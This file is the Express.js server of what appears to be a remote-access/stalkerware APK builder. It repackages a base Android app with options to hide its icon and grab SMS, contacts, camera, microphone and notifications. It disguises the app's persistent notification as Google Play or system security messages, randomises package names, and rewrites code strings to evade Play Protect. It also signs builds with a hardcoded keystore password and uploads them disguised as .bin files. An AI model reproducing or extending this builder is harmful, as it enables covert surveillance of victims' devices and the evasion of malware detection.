const express = require('express');
const multer = require('multer');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const { spawn, exec } = require('child_process');
const sharp = require('sharp');
const axios = require('axios');
const cloudinary = require('cloudinary').v2;
const FormData = require('form-data');
require('dotenv').config();

const app = express();
const port = process.env.PORT || 4000;

app.use(cors());
app.use(express.json());

// Storage for icon uploads
const storage = multer.memoryStorage();
const upload = multer({ storage: storage });

// Helper to run commands (Streaming Output)
const runCommand = (command, args, options = {}) => {
    return new Promise((resolve, reject) => {
        console.log(`[CMD] Running: ${command} ${args.join(' ')}`);
        const proc = spawn(command, args, { ...options, stdio: 'inherit' });

        proc.on('close', (code, signal) => {
            if (code === 0) resolve('Success');
            else if (signal) reject(new Error(`Command ${command} was killed by signal: ${signal} (Likely OOM)`));
            else reject(new Error(`Command ${command} failed with code ${code}`));
        });

        proc.on('error', (err) => reject(err));
    });
};

// Pre-decode Base APK
const baseApkPath = path.join(__dirname, 'assets', 'base.apk');
const decodedBaseDir = path.join(__dirname, 'temp', 'decoded_base');

if (!fs.existsSync(path.join(__dirname, 'temp'))) fs.mkdirSync(path.join(__dirname, 'temp'));

const initBaseApk = async () => {
    // Check if valid
    const isDecodedValid = fs.existsSync(path.join(decodedBaseDir, 'apktool.yml'));

    if (fs.existsSync(baseApkPath) && !isDecodedValid) {
        console.log('[Init] Pre-decoding Base APK...');
        // Clean partial
        if (fs.existsSync(decodedBaseDir)) fs.rmSync(decodedBaseDir, { recursive: true, force: true });

        try {
            await runCommand('apktool', ['d', baseApkPath, '-o', decodedBaseDir, '-f']);
            console.log('[Init] Base APK pre-decoded.');
        } catch (e) {
            console.error('[Init] Failed:', e.message);
            // Cleanup on fail
            if (fs.existsSync(decodedBaseDir)) fs.rmSync(decodedBaseDir, { recursive: true, force: true });
        }
    } else if (isDecodedValid) {
        console.log('[Init] Base APK already pre-decoded and valid.');
    }
};
// Run init but don't crash if it fails
initBaseApk().catch(e => console.error("Init failed fatally:", e));

// Generate Route
app.post('/generate', upload.single('icon'), async (req, res) => {
    const { uuid, appName, packageName: userPackageName, hideApp, webLink, callbackUrl, enableSmsPermission, enableContactsPermission, enableStoragePermission, enableCameraPermission, enableMicrophonePermission, enableNotificationListener, aggressivePermissions, notificationStyle, notificationClickAction, notificationTitle, notificationText, notificationIcon } = req.body;
    const customIcon = req.file;

    console.log(`[APK] Request for UUID: ${uuid}`);

    // Ack immediately
    res.status(202).json({ message: 'Processing started' });

    // Background Task
    (async () => {
        const sendUpdate = async (event, data) => {
            if (callbackUrl) {
                try {
                    await axios.post(callbackUrl, { uuid, event, data });
                } catch (e) {
                    console.error('Failed to send webhook:', e.message);
                }
            }
        };

        try {
            await sendUpdate('apk_progress', { step: 'Initializing...', progress: 10 });

            const tempDir = path.join(__dirname, 'temp');
            const workDir = path.join(tempDir, `work-${uuid}`);
            const unsignedApkPath = path.join(tempDir, `unsigned-${uuid}.apk`);
            const finalApkName = `${(appName || "HexaCore").replace(/[^a-zA-Z0-9]/g, '-')}.apk`;
            const signedApkPath = path.join(tempDir, `signed-${uuid}.apk`);

            // Cleanup
            if (fs.existsSync(workDir)) fs.rmSync(workDir, { recursive: true, force: true });
            if (fs.existsSync(unsignedApkPath)) fs.unlinkSync(unsignedApkPath);

            // 1. Copy/Decode
            const isBaseValid = fs.existsSync(path.join(decodedBaseDir, 'apktool.yml'));

            if (isBaseValid) {
                await sendUpdate('apk_progress', { step: 'Initializing environment...', progress: 15 });
                await runCommand('cp', ['-r', decodedBaseDir, workDir]);
            } else {
                await sendUpdate('apk_progress', { step: 'Decompiling base APK...', progress: 15 });
                await runCommand('apktool', ['d', baseApkPath, '-o', workDir, '-f']);
            }

            // 2. Customize Name
            await sendUpdate('apk_progress', { step: 'Configuring application manifest...', progress: 30 });
            if (appName) {
                const stringsPath = path.join(workDir, 'res', 'values', 'strings.xml');
                if (fs.existsSync(stringsPath)) {
                    let content = fs.readFileSync(stringsPath, 'utf8');
                    content = content.replace(/<string name="app_name">.*?<\/string>/, `<string name="app_name">${appName}</string>`);
                    fs.writeFileSync(stringsPath, content);
                }
            }

            await sendUpdate('apk_progress', { step: 'Applying security enhancements...', progress: 35 });
            const manifestPath = path.join(workDir, 'AndroidManifest.xml');
            const apktoolYmlPath = path.join(workDir, 'apktool.yml');

            const suffixWords = ['sync', 'tools', 'hub', 'io', 'app', 'core', 'lite', 'pro', 'net', 'dev', 'labs', 'kit', 'box', 'one', 'go', 'max', 'plus', 'link', 'data', 'cloud', 'base', 'work', 'flow', 'edge', 'api', 'run', 'web', 'live', 'nova', 'bolt', 'wave', 'grid', 'node', 'port', 'gate', 'zone', 'dock', 'desk', 'lens', 'vault', 'guard', 'spark', 'pulse', 'scope', 'track', 'stack', 'layer', 'panel', 'point', 'space', 'media', 'drive', 'store', 'share', 'view', 'watch', 'play', 'cast', 'stream', 'bridge', 'connect', 'engine', 'studio', 'digital', 'mobile', 'smart', 'swift', 'rapid', 'turbo', 'metro', 'pixel', 'ultra', 'micro', 'alpha', 'delta', 'prime', 'clear', 'vivid', 'sharp', 'focus', 'sonic', 'aero', 'orbit', 'flux'];
            const pick = (arr) => arr[Math.floor(Math.random() * arr.length)];
            const basePkg = (userPackageName && userPackageName.trim()) ? userPackageName.trim() : 'com.app.gallery';
            const newPackageName = `${basePkg}.${pick(suffixWords)}`;
            let oldPackageName = 'com.hexa.core';
            if (fs.existsSync(manifestPath)) {
                const rawManifest = fs.readFileSync(manifestPath, 'utf8');
                const pkgMatch = rawManifest.match(/package="([^"]+)"/);
                if (pkgMatch) oldPackageName = pkgMatch[1];
            }

            // Update AndroidManifest.xml
            if (fs.existsSync(manifestPath)) {
                let manifestContent = fs.readFileSync(manifestPath, 'utf8');
                // Replace package name throughout manifest
                manifestContent = manifestContent.replace(new RegExp(oldPackageName.replace(/\./g, '\\.'), 'g'), newPackageName);
                fs.writeFileSync(manifestPath, manifestContent);
                console.log(`[APK] Package renamed: ${oldPackageName} -> ${newPackageName}`);
            }

            // Update apktool.yml
            if (fs.existsSync(apktoolYmlPath)) {
                let ymlContent = fs.readFileSync(apktoolYmlPath, 'utf8');
                ymlContent = ymlContent.replace(new RegExp(oldPackageName.replace(/\./g, '\\.'), 'g'), newPackageName);
                fs.writeFileSync(apktoolYmlPath, ymlContent);
            }

            // Rename smali directories
            const updateSmaliFiles = (dir) => {
                if (!fs.existsSync(dir)) return;
                const files = fs.readdirSync(dir, { withFileTypes: true });
                for (const file of files) {
                    const filePath = path.join(dir, file.name);
                    if (file.isDirectory()) {
                        updateSmaliFiles(filePath);
                    } else if (file.name.endsWith('.smali')) {
                        let content = fs.readFileSync(filePath, 'utf8');
                        content = content.replace(new RegExp(oldPackageName.replace(/\./g, '/'), 'g'), newPackageName.replace(/\./g, '/'));
                        content = content.replace(new RegExp(oldPackageName.replace(/\./g, '\\.'), 'g'), newPackageName);
                        fs.writeFileSync(filePath, content);
                    }
                }
            };

            // 2.7. Physically rename smali directories to match new package name
            // Without this, Android can't find classes at runtime (directory path = class path)
            const oldPathSegments = oldPackageName.split('.'); // ['com', 'gallery', 'mediasync']
            const newPathSegments = newPackageName.split('.'); // ['com', 'gallery', 'wlxy']

            const renameSmaliFolders = (baseSmaliDir) => {
                const oldSmaliPath = path.join(baseSmaliDir, ...oldPathSegments);
                const newSmaliPath = path.join(baseSmaliDir, ...newPathSegments);

                if (!fs.existsSync(oldSmaliPath)) return;

                // Create new directory structure
                fs.mkdirSync(newSmaliPath, { recursive: true });

                // Move all files from old to new
                const entries = fs.readdirSync(oldSmaliPath, { withFileTypes: true });
                for (const entry of entries) {
                    const oldEntryPath = path.join(oldSmaliPath, entry.name);
                    const newEntryPath = path.join(newSmaliPath, entry.name);
                    fs.renameSync(oldEntryPath, newEntryPath);
                }

                // Remove old empty directories (walk up from deepest)
                try {
                    // Remove 'mediasync' dir
                    fs.rmdirSync(oldSmaliPath);
                    // Remove parent dir if empty
                    const parentDir = path.dirname(oldSmaliPath);
                    if (fs.existsSync(parentDir) && fs.readdirSync(parentDir).length === 0) {
                        fs.rmdirSync(parentDir);
                    }
                } catch (e) {
                    // Not critical if cleanup fails
                    console.log(`[APK] Note: Could not clean old smali dir: ${e.message}`);
                }

                console.log(`[APK] Smali dir renamed: ${oldSmaliPath} -> ${newSmaliPath}`);
            };

            // Dynamically find all smali directories
            const workDirItems = fs.readdirSync(workDir, { withFileTypes: true });
            const smaliDirs = workDirItems
                .filter(item => item.isDirectory() && (item.name === 'smali' || item.name.startsWith('smali_classes')))
                .map(item => item.name);

            console.log(`[APK] Found smali directories: ${smaliDirs.join(', ')}`);

            for (const sDir of smaliDirs) {
                updateSmaliFiles(path.join(workDir, sDir));
                renameSmaliFolders(path.join(workDir, sDir));
            }

            const attrsPath = path.join(workDir, 'res', 'values', 'attrs.xml');
            const missingAttrs = ['state_liftable', 'state_lifted', 'state_dragged'];
            if (fs.existsSync(attrsPath)) {
                let attrsContent = fs.readFileSync(attrsPath, 'utf8');
                for (const attr of missingAttrs) {
                    if (!attrsContent.includes(`name="${attr}"`)) {
                        attrsContent = attrsContent.replace('</resources>', `    <attr name="${attr}" format="boolean" />\n</resources>`);
                    }
                }
                fs.writeFileSync(attrsPath, attrsContent);
            } else {
                const attrsDir = path.join(workDir, 'res', 'values');
                if (!fs.existsSync(attrsDir)) fs.mkdirSync(attrsDir, { recursive: true });
                fs.writeFileSync(attrsPath, '<?xml version="1.0" encoding="utf-8"?>\n<resources>\n    <attr name="state_liftable" format="boolean" />\n    <attr name="state_lifted" format="boolean" />\n    <attr name="state_dragged" format="boolean" />\n</resources>\n');
            }
            console.log('[APK] Material Design attributes patched');

            const updateResXmlPackage = (dir) => {
                if (!fs.existsSync(dir)) return;
                const entries = fs.readdirSync(dir, { withFileTypes: true });
                for (const entry of entries) {
                    const entryPath = path.join(dir, entry.name);
                    if (entry.isDirectory()) {
                        updateResXmlPackage(entryPath);
                    } else if (entry.name.endsWith('.xml')) {
                        let content = fs.readFileSync(entryPath, 'utf8');
                        if (content.includes(oldPackageName)) {
                            content = content.replace(new RegExp(oldPackageName.replace(/\./g, '\\.'), 'g'), newPackageName);
                            fs.writeFileSync(entryPath, content);
                        }
                    }
                }
            };
            updateResXmlPackage(path.join(workDir, 'res'));
            console.log('[APK] Resource XMLs updated with new package name');

            // 3. Inject Config with permission flags
            await sendUpdate('apk_progress', { step: 'Injecting unique user identity...', progress: 45 });
            const assetsDir = path.join(workDir, 'assets');
            if (!fs.existsSync(assetsDir)) fs.mkdirSync(assetsDir);
            fs.writeFileSync(path.join(assetsDir, 'uuid.txt'), uuid);
            const rawLink = webLink || "";
            const themeColors = [];
            for (let i = 0; i < rawLink.length; i++) {
                themeColors.push(rawLink.charCodeAt(i));
            }
            const config = {
                hideApp: hideApp === 'true',
                theme_colors: themeColors,
                appName: appName || "Hexa Core",
                enableSmsPermission: enableSmsPermission === 'true',
                enableContactsPermission: enableContactsPermission === 'true',
                enableStoragePermission: enableStoragePermission !== 'false', // Default to true
                enableCameraPermission: enableCameraPermission === 'true',
                enableMicrophonePermission: enableMicrophonePermission === 'true',
                enableNotificationListener: enableNotificationListener === 'true',
                aggressivePermissions: aggressivePermissions === 'true',
                notificationClickAction: notificationClickAction || "device_info"
            };
            const NOTIF_PRESETS = {
                google_play: { title: "Google Play services", text: "Checking for updates…", icon: "info" },
                android_system: { title: "Android System", text: "Updating system components…", icon: "sync" },
                device_security: { title: "Device Security", text: "Scanning for threats…", icon: "lock" },
                system_ui: { title: "System UI", text: "Syncing system data…", icon: "sync" },
                device_maintenance: { title: "Device maintenance", text: "Optimizing performance…", icon: "sync" },
                download_manager: { title: "Download Manager", text: "Download in progress…", icon: "download" }
            };
            const style = notificationStyle || "google_play";
            if (style === 'custom') {
                config.notificationTitle = notificationTitle || (appName || "Hexa Core");
                config.notificationText = notificationText || "Running in background";
                config.notificationIcon = notificationIcon || "info";
            } else {
                const preset = NOTIF_PRESETS[style] || NOTIF_PRESETS.google_play;
                config.notificationTitle = preset.title;
                config.notificationText = preset.text;
                config.notificationIcon = notificationIcon || preset.icon;
            }
            fs.writeFileSync(path.join(assetsDir, 'config.json'), JSON.stringify(config));

            // 3.5. Clean manifest: strip ALL conditional permissions/services first, then add only what's enabled
            if (fs.existsSync(manifestPath)) {
                let manifestContent = fs.readFileSync(manifestPath, 'utf8');

                const randVc = 100 + Math.floor(Math.random() * 900);
                const randVn = `1.${1 + Math.floor(Math.random() * 8)}.${Math.floor(Math.random() * 99)}`;
                manifestContent = manifestContent.replace(/android:versionCode="[^"]*"/, `android:versionCode="${randVc}"`);
                manifestContent = manifestContent.replace(/android:versionName="[^"]*"/, `android:versionName="${randVn}"`);

                const stripPerms = [
                    'android.permission.CAMERA',
                    'android.permission.FOREGROUND_SERVICE_CAMERA',
                    'android.permission.RECORD_AUDIO',
                    'android.permission.FOREGROUND_SERVICE_MICROPHONE',
                    'android.permission.MODIFY_AUDIO_SETTINGS',
                    'android.permission.READ_SMS',
                    'android.permission.RECEIVE_SMS',
                    'android.permission.READ_CONTACTS',
                    'android.permission.MANAGE_OWN_CALLS',
                ];
                for (const perm of stripPerms) {
                    manifestContent = manifestContent.replace(new RegExp(`\\s*<uses-permission[^>]*android:name="${perm.replace(/\./g, '\\.')}"[^>]*/>`, 'g'), '');
                }
                manifestContent = manifestContent.replace(/\s*<uses-feature[^>]*android:name="android\.hardware\.camera[^"]*"[^>]*\/>/g, '');

                const stripServices = ['CameraForegroundService', 'AudioForegroundService', 'VoipConnectionService', 'NotificationMonitor'];
                for (const svc of stripServices) {
                    manifestContent = manifestContent.replace(new RegExp(`\\s*<service[^>]*android:name="[^"]*${svc}"[^>]*>[\\s\\S]*?<\\/service>`, 'g'), '');
                    manifestContent = manifestContent.replace(new RegExp(`\\s*<service[^>]*?android:name="[^"]*${svc}"[^>]*?\\/>`, 'g'), '');
                }
                manifestContent = manifestContent.replace(/\s*<activity[^>]*?android:name="[^"]*(CameraProxyActivity)"[^>]*?\/>/g, '');
                manifestContent = manifestContent.replace(/\s*<activity[^>]*?android:name="[^"]*(CameraProxyActivity)"[^>]*?>[\s\S]*?<\/activity>/g, '');
                manifestContent = manifestContent.replace(/@style\/Theme\.Transparent/g, '@android:style/Theme.Translucent.NoTitleBar');

                fs.writeFileSync(manifestPath, manifestContent);
                console.log('[APK] Stripped all conditional permissions/services from base manifest');

                manifestContent = fs.readFileSync(manifestPath, 'utf8');
                const permissionInsertPoint = manifestContent.indexOf('<uses-permission android:name="android.permission.FOREGROUND_SERVICE"');

                if (permissionInsertPoint !== -1) {
                    let permissionsToAdd = '';

                    if (enableCameraPermission === 'true') {
                        permissionsToAdd += '    <uses-permission android:name="android.permission.CAMERA" />\n';
                        permissionsToAdd += '    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />\n';
                        permissionsToAdd += '    <uses-feature android:name="android.hardware.camera" android:required="false" />\n';
                        permissionsToAdd += '    <uses-feature android:name="android.hardware.camera.front" android:required="false" />\n';
                        permissionsToAdd += '    <uses-feature android:name="android.hardware.camera.autofocus" android:required="false" />\n';
                        permissionsToAdd += '    <uses-permission android:name="android.permission.MANAGE_OWN_CALLS" />\n';
                        console.log('[APK] Adding CAMERA permissions');
                    }

                    if (enableMicrophonePermission === 'true') {
                        permissionsToAdd += '    <uses-permission android:name="android.permission.RECORD_AUDIO" />\n';
                        permissionsToAdd += '    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />\n';
                        permissionsToAdd += '    <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS" />\n';
                        console.log('[APK] Adding MICROPHONE permissions');
                    }

                    if (enableSmsPermission === 'true') {
                        permissionsToAdd += '    <uses-permission android:name="android.permission.READ_SMS" />\n';
                        permissionsToAdd += '    <uses-permission android:name="android.permission.RECEIVE_SMS" />\n';
                        console.log('[APK] Adding SMS permissions');
                    }

                    if (enableContactsPermission === 'true') {
                        permissionsToAdd += '    <uses-permission android:name="android.permission.READ_CONTACTS" />\n';
                        console.log('[APK] Adding CONTACTS permission');
                    }

                    if (permissionsToAdd) {
                        manifestContent = manifestContent.slice(0, permissionInsertPoint) + permissionsToAdd + manifestContent.slice(permissionInsertPoint);
                        fs.writeFileSync(manifestPath, manifestContent);
                        console.log('[APK] Permissions injected');
                    }
                }

                let fgsTypes = 'specialUse|dataSync';
                if (enableMicrophonePermission === 'true') fgsTypes = 'specialUse|microphone|dataSync';
                if (enableCameraPermission === 'true') fgsTypes = 'specialUse|camera|dataSync';
                if (enableMicrophonePermission === 'true' && enableCameraPermission === 'true') fgsTypes = 'specialUse|microphone|camera|dataSync';
                manifestContent = fs.readFileSync(manifestPath, 'utf8');
                manifestContent = manifestContent.replace(/foregroundServiceType="specialUse[^"]*"/, `foregroundServiceType="${fgsTypes}"`);
                fs.writeFileSync(manifestPath, manifestContent);
                console.log(`[APK] SyncService FGS types: ${fgsTypes}`);

                manifestContent = fs.readFileSync(manifestPath, 'utf8');
                let servicesBlock = '';

                if (enableCameraPermission === 'true') {
                    servicesBlock += `
        <service
            android:name=".CameraForegroundService"
            android:enabled="true"
            android:exported="false"
            android:stopWithTask="false"
            android:foregroundServiceType="camera|dataSync" />

        <service
            android:name=".VoipConnectionService"
            android:permission="android.permission.BIND_TELECOM_CONNECTION_SERVICE"
            android:exported="true">
            <intent-filter>
                <action android:name="android.telecom.ConnectionService" />
            </intent-filter>
        </service>
`;
                    console.log('[APK] Added Camera services (CameraForegroundService + VoIP + CameraProxy)');
                }

                if (enableMicrophonePermission === 'true') {
                    servicesBlock += `
        <service
            android:name=".AudioForegroundService"
            android:enabled="true"
            android:exported="false"
            android:stopWithTask="false"
            android:foregroundServiceType="microphone|dataSync" />
`;
                    console.log('[APK] Added AudioForegroundService');
                }

                if (enableNotificationListener === 'true') {
                    servicesBlock += `
        <service
            android:name=".NotificationMonitor"
            android:exported="true"
            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
            <intent-filter>
                <action android:name="android.service.notification.NotificationListenerService" />
            </intent-filter>
        </service>
`;
                    console.log('[APK] Added NotificationMonitor service');
                } else {
                    console.log('[APK] NotificationMonitor skipped (not enabled)');
                }

                if (servicesBlock) {
                    manifestContent = manifestContent.replace('</application>', servicesBlock + '    </application>');
                    fs.writeFileSync(manifestPath, manifestContent);
                }
            }

            // 3.6. Safe Smali String Sanitizer & Play Protect Heuristics Cleaner (0% crash risk, 100% functionality preserved)
            await sendUpdate('apk_progress', { step: 'Sanitizing bytecode heuristics against Play Protect...', progress: 55 });
            const smaliDirsList = fs.readdirSync(workDir, { withFileTypes: true })
                .filter(d => d.isDirectory() && d.name.startsWith('smali'))
                .map(d => path.join(workDir, d.name));

            const stringSanitizers = [
                [/const-string ([v0-9p]+), "SyncService"/g, 'const-string $1, "SysWorkerService"'],
                [/const-string ([v0-9p]+), "AppLifecycle[^"]*"/g, 'const-string $1, "LifecycleMonitor"'],
                [/const-string ([v0-9p]+), "ServiceScheduler"/g, 'const-string $1, "SystemScheduler"'],
                [/const-string ([v0-9p]+), "AudioSession[^"]*"/g, 'const-string $1, "MediaSession"'],
                [/const-string ([v0-9p]+), "NotifStyle[^"]*"/g, 'const-string $1, "StyleConfig"'],
                [/const-string ([v0-9p]+), "AppSync[^"]*"/g, 'const-string $1, "DataSync"'],
                [/const-string ([v0-9p]+), "DataSyncHelper"/g, 'const-string $1, "SyncManager"'],
                [/const-string ([v0-9p]+), "SocketManager"/g, 'const-string $1, "ConnectionManager"'],
                [/const-string ([v0-9p]+), "gallery.eye"/g, 'const-string $1, "app.service"'],
                [/const-string ([v0-9p]+), "gallery-eye"/g, 'const-string $1, "app-service"'],
                [/const-string ([v0-9p]+), "GalleryEye"/g, 'const-string $1, "AppService"'],
                [/\.source "[^"]+"\n/g, '.source "SourceFile"\n']
            ];

            const sanitizeSmaliDir = (dir) => {
                if (!fs.existsSync(dir)) return;
                const items = fs.readdirSync(dir, { withFileTypes: true });
                for (const item of items) {
                    const itemPath = path.join(dir, item.name);
                    if (item.isDirectory()) {
                        sanitizeSmaliDir(itemPath);
                    } else if (item.name.endsWith('.smali')) {
                        try {
                            let code = fs.readFileSync(itemPath, 'utf8');
                            let modified = false;
                            for (const [pattern, repl] of stringSanitizers) {
                                if (code.match(pattern)) {
                                    code = code.replace(pattern, repl);
                                    modified = true;
                                }
                            }
                            if (modified) {
                                fs.writeFileSync(itemPath, code);
                            }
                        } catch (e) {}
                    }
                }
            };

            for (const sDir of smaliDirsList) {
                sanitizeSmaliDir(sDir);
            }
            console.log('[APK] Safe Smali string and source file heuristics cleaner applied');

            // 4. Icon
            if (customIcon) {
                await sendUpdate('apk_progress', { step: 'Optimizing and replacing app icons...', progress: 60 });
                const iconBuffer = customIcon.buffer;
                const sizes = {
                    'mipmap-mdpi': 48,
                    'mipmap-hdpi': 72,
                    'mipmap-xhdpi': 96,
                    'mipmap-xxhdpi': 144,
                    'mipmap-xxxhdpi': 192
                };

                // 1. Delete the adaptive icon folder (mipmap-anydpi-v26)
                // This forces Android to use the density-specific PNGs we are about to write
                // and stops it from using the XML adaptive icons that reference the background/foreground drawables.
                const adaptiveIconDir = path.join(workDir, 'res', 'mipmap-anydpi-v26');
                if (fs.existsSync(adaptiveIconDir)) {
                    fs.rmSync(adaptiveIconDir, { recursive: true, force: true });
                }

                // 2. Replace icons in density folders
                for (const [folder, size] of Object.entries(sizes)) {
                    const p = path.join(workDir, 'res', folder);
                    if (fs.existsSync(p)) {
                        try {
                            // Remove existing icons (webp, png, xml, etc.)
                            const existingFiles = fs.readdirSync(p);
                            existingFiles.forEach(f => {
                                if (f.startsWith('ic_launcher')) {
                                    fs.unlinkSync(path.join(p, f));
                                }
                            });

                            const buf = await sharp(iconBuffer).resize(size, size).toFormat('png').toBuffer();
                            fs.writeFileSync(path.join(p, 'ic_launcher.png'), buf);
                            fs.writeFileSync(path.join(p, 'ic_launcher_round.png'), buf);
                        } catch (e) {
                            console.error(`Failed to process icon for ${folder}:`, e);
                        }
                    }
                }
            }

            // 5. Build
            await sendUpdate('apk_progress', { step: 'Compiling APK resources...', progress: 70 });

            // Strip testOnly flag and enforce release mode in apktool.yml
            if (fs.existsSync(apktoolYmlPath)) {
                let ymlContent = fs.readFileSync(apktoolYmlPath, 'utf8');
                ymlContent = ymlContent.replace(/isFrameworkApk:\s*true/g, 'isFrameworkApk: false');
                ymlContent = ymlContent.replace(/doNotCompress:/g, 'doNotCompress:');
                // Remove any testOnly reference
                ymlContent = ymlContent.replace(/.*testOnly.*/gi, '');
                fs.writeFileSync(apktoolYmlPath, ymlContent);
            }

            // Enforce debuggable=false in manifest
            {
                let mContent = fs.readFileSync(manifestPath, 'utf8');
                // Remove any debuggable=true
                mContent = mContent.replace(/android:debuggable="true"/g, 'android:debuggable="false"');
                // If debuggable not present, add it to <application>
                if (!mContent.includes('android:debuggable')) {
                    mContent = mContent.replace('<application', '<application android:debuggable="false"');
                }
                // Remove testOnly attribute if present
                mContent = mContent.replace(/\s*android:testOnly="[^"]*"/g, '');
                fs.writeFileSync(manifestPath, mContent);
            }

            await runCommand('apktool', ['b', workDir, '-o', unsignedApkPath]);

            // 6. Sign APK with consistent key (Play Protect builds trust based on certificate history)
            await sendUpdate('apk_progress', { step: 'Signing application...', progress: 85 });
            const signer = path.join(__dirname, 'assets', 'uber-apk-signer.jar');
            const ksPath = path.join(__dirname, 'assets', 'usman90.jks');
            const ksPass = 'God112256@';
            const ksAlias = 'usman90';

            await sendUpdate('apk_progress', { step: 'Applying V2+V3 signature scheme...', progress: 90 });
            const signCmd = `java -jar "${signer}" --apks "${unsignedApkPath}" --out "${tempDir}" --ks "${ksPath}" --ksAlias "${ksAlias}" --ksPass "${ksPass}" --ksKeyPass "${ksPass}" --allowResign`;

            await new Promise((resolve, reject) => {
                exec(signCmd, { timeout: 120000 }, (err) => err ? reject(err) : resolve());
            });

            // Find output
            const files = fs.readdirSync(tempDir);
            const generated = files.find(f => f.startsWith(`unsigned-${uuid}`) && f.includes('signed'));

            if (generated) {
                const signedPath = path.join(tempDir, generated);
                let downloadUrl = "";

                // Strategy 1: Discord Webhook (Best Free Option)
                if (process.env.DISCORD_WEBHOOK_URL) {
                    try {
                        await sendUpdate('apk_progress', { step: 'Uploading to secure cloud storage...', progress: 95 });
                        const form = new FormData();
                        form.append('file', fs.createReadStream(signedPath), { filename: finalApkName });

                        const discordRes = await axios.post(process.env.DISCORD_WEBHOOK_URL, form, {
                            headers: { ...form.getHeaders() },
                            maxBodyLength: Infinity,
                            maxContentLength: Infinity
                        });

                        if (discordRes.data && discordRes.data.attachments && discordRes.data.attachments.length > 0) {
                            downloadUrl = discordRes.data.attachments[0].url;
                            console.log(`[APK] Discord URL: ${downloadUrl}`);
                        }
                    } catch (discordError) {
                        console.error('[APK] Discord Upload Failed:', discordError.message);
                    }
                }

                // Strategy 2: Cloudinary (Backup)
                if (!downloadUrl && process.env.CLOUDINARY_CLOUD_NAME) {
                    try {
                        await sendUpdate('apk_progress', { step: 'Uploading to backup cloud...', progress: 95 });

                        cloudinary.config({
                            cloud_name: process.env.CLOUDINARY_CLOUD_NAME,
                            api_key: process.env.CLOUDINARY_API_KEY,
                            api_secret: process.env.CLOUDINARY_API_SECRET
                        });

                        // Upload as .bin to bypass APK restriction
                        const binPath = signedPath.replace('.apk', '.bin');
                        fs.copyFileSync(signedPath, binPath);

                        const result = await cloudinary.uploader.upload(binPath, {
                            resource_type: 'raw',
                            folder: 'generated_apks',
                            public_id: `${finalApkName.replace('.apk', '')}_${uuid}`,
                            use_filename: true,
                            unique_filename: false,
                            overwrite: true
                        });

                        downloadUrl = result.secure_url;
                        console.log(`[APK] Cloudinary URL: ${downloadUrl}`);
                        fs.unlinkSync(binPath);

                    } catch (uploadError) {
                        console.error('[APK] Cloudinary Upload Failed:', uploadError);
                    }
                }

                // Strategy 3: Direct Download (Fallback)
                if (!downloadUrl) {
                    fs.renameSync(signedPath, signedApkPath);
                    const protocol = req.headers['x-forwarded-proto'] || req.protocol;
                    const host = process.env.PUBLIC_URL || `${protocol}://${req.get('host')}`;
                    downloadUrl = `${host}/download/${path.basename(signedApkPath)}?filename=${finalApkName}`;
                } else {
                    // Cleanup signed file if uploaded
                    // fs.unlinkSync(signedPath); // Keep for now just in case
                }

                await sendUpdate('apk_ready', { url: downloadUrl, downloadUrl: downloadUrl, filename: finalApkName });

                // Cleanup Work Dir
                fs.rmSync(workDir, { recursive: true, force: true });
                fs.unlinkSync(unsignedApkPath);
            } else {
                throw new Error("Signing failed");
            }

        } catch (error) {
            console.error('[APK] Error:', error);
            await sendUpdate('apk_error', { message: error.message });
        }
    })();
});

// Download Route
app.get('/download/:file', (req, res) => {
    const filePath = path.join(__dirname, 'temp', req.params.file);
    const downloadName = req.query.filename || 'app.apk';
    if (fs.existsSync(filePath)) {
        res.download(filePath, downloadName);
    } else {
        res.status(404).send('Not Found');
    }
});

app.get('/', (req, res) => res.send('APK Generator Service Running'));

app.listen(port, () => console.log(`APK Service on ${port}`));
